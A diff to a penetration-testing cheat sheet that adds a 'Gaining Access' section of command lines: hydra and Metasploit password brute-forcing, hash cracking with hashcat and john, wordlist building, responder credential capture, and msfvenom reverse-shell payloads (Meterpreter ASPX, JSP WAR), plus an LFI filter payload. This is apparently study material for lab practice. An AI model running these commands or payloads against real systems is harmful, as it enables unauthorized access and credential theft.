@@ -806,6 +806,118 @@ powershell ls "\\dc01\pipe\spoolss"
     
 # Scanning done
 
+# Gaining Access
+
+- hydra: bruteforce tool
+
+    ```bash
+    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.101 -t 4 -v -f
+    #-l is the user we want to attack, -P password file list, -t threads, -v verbose
+    #it's better to intercept the login page with burp, check to see the correct username&password syntax and copy the exact failed message
+    -#f   exit when a login/pass pair is found
+    hydra -l hasamba -P ~/Desktop/test_passwords.txt 10.0.0.210 -s 8085 http-post-form "/login/:username=^USER^&password=^PASS^:F=Authentication failed" -VVV -t 6 -
+    hydra OPT #will show us optional moduls for http and such
+    hydra -U MODULE_NAME #will show module examples
+
+    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V #Hydra FTP brute force
+    hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V #Hydra POP3 brute force
+    hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V #Hydra SMTP brute force
+
+    hydra -l username -P password-list <URL_TO_SERVER> http-post-form "<PATH-TO_LOGIN>:POST_REQUEST_FOR_LOGIN:FAILED_RESPONSE_IDENTIFIER"
+    ```
+
+- metasploit - can also bruteforce
+
+    ```bash
+    use auxialary/scanner/ssh/ssh_login
+    options
+    set username root
+    set pass_file /usr/share...
+    set rhosts
+    set threads 10
+    set verbose true
+    run
+    ```
+
+- unshadow (kali) - combine both files and will insert the hashed passwords to the passwd file, so we can use this file with hashcat to maybe decrypt the password.
+
+    ```bash
+    unshadow PASSSWD_FILE SHADOW_FILE
+    ```
+
+- [hashcat](https://www.notion.so/Hashcat-b885f8ac8c0f450986d62c0d29f44cb9) - crack passwords hashes ([Cheat Sheet](https://s3.us-west-2.amazonaws.com/secure.notion-static.com/a44ab748-a9a9-437e-a4a1-2fa1cc6c03a8/HashcatCheatSheet.v2018.1b.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAT73L2G45O3KS52Y5%2F20201122%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20201122T190235Z&X-Amz-Expires=86400&X-Amz-Signature=03753b73d70b97901e6a764011ae5ffdbffc2d9dcbd00673f79b64097b1299d9&X-Amz-SignedHeaders=host&response-content-disposition=filename%20%3D%22HashcatCheatSheet.v2018.1b.pdf%22))
+
+    ```bash
+    hashcat -m "OSCODE" unshadow.txt passwordFile.txt
+    #from here: https://github.com/frizb/Hashcat-Cheatsheet
+    hashcat --force -m300 --status -w3 -o found.txt --remove --potfile-disable -r rules\OneRuleToRuleThemAll.rule hash.txt rockyou.txt
+    ```
+
+- hash-identifier
+
+    ```bash
+    hash-identifier [hash]
+    ```
+
+- [name-that-hash](https://github.com/HashPals/Name-That-Hash) - better hash analyzer
+
+    ```jsx
+
+    ```
+
+- cewl - create wordlist from a website
+
+    ```bash
+    cewl  -v --with-numbers -e --email_file cewl_email.wordlist -w cewl.wordlist http://sneakycorp.htbme
+
+    #my favorite rule to add:
+    john --wordlist=wordlist.txt --rules=jumbo --stdout > wordlist-modified.txt
+
+    hashcat --force cewl.wordlist -r /usr/share/hashcat/rules/best64.rule --stdout > hashcat_words
+
+    https://github.com/praetorian-inc/Hob0Rules
+    ###hob064 This ruleset contains 64 of the most frequent password patterns
+    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/rockyou.txt -r hob064.rule -o cracked.txt
+
+    ###d3adhob0 This ruleset is much more extensive and utilizes many common password structure ideas
+    hashcat -a 0 -m 1000 <NTLMHASHES> wordlists/english.txt -r d3adhob0.rule -o cracked.txt
+
+    #adding John rules
+    john --wordlist=wordlist.txt --rules --stdout > wordlist-modified.txt
+    john --wordlist=wordlist.txt --rules=best64 --stdout > wordlist-modified.txt
+    ```
+
+- john the ripper - password cracker ([cheat sheet](https://drive.google.com/viewerng/viewer?url=https://countuponsecurity.files.wordpress.com/2016/09/jtr-cheat-sheet.pdf)) ([Jumbo community version](https://github.com/openwall/john))
+
+    ```bash
+    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+    #after john finished, ask him to show
+    john hashes.txt --show
+
+    john 127.0.0.1.pwdump --wordlist=dictionary.txt --rules=Jumbo #with jumbo rules from https://github.com/openwall/john
+    ```
+
+    [CyberChef](https://gchq.github.io/CyberChef/)
+
+    [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
+
+    [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/)
+
+    [Cipher Identifier (online tool) | Boxentriq](https://www.boxentriq.com/code-breaking/cipher-identifier)
+
+- msfvenom(kali) - tool to create malware
+
+    ```bash
+    msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=10.10.10.14 LPORT=4444 -f aspx > ex.aspx
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+    ```
+
+- [responder (imapcket)](https://www.notion.so/responder-imapcket-b7bdbbb91ce74e98834dd88ec1715528) - MITM - listening in the background and wait for a failed dns request
+
+    ```bash
+    responder -I eth0 -rdwv #Run Responder.py for the length of the engagement while you're working on other attack vectors.
+
 ## Local File Inclusion
 `http://[IP]/index.php?file=php://filter/convert.base64-encode/resource=index.php`
 
@@ -1251,13 +1363,4 @@ Fuzz a range of ids/port numbers.
   
 
 
-## Basic Auth Bruteforcing 
 
-  ## Hydra
-
-`hydra -l root -p admin 192.168.1.105 -t 4 ssh`
-
-`hydra -L root -P File 192.168.1.105 -t 4 ssh`
-
-`hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.X http-post-form "/login:username=^USER^&password=^PASS^:F=failed"`
-  
